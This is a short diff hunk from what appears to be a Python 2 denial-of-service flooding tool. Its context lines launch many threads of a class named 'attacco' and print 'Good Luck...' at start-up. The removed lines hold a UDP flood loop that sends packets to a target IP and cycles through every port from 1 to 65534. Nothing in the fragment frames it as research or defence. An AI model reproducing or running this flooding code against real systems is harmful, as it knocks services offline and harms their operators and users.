@@ -354,11 +354,7 @@ for x in xrange(thread):
     attacco().start()
     time.sleep(0.003)
 	
-	while True:
-     sock.sendto(bytes, (ip,port))
-     port = port + 1
-     if port == 65534:
-       port = 1
+	
 
 print "Program Started..."
 print "Good Luck..."
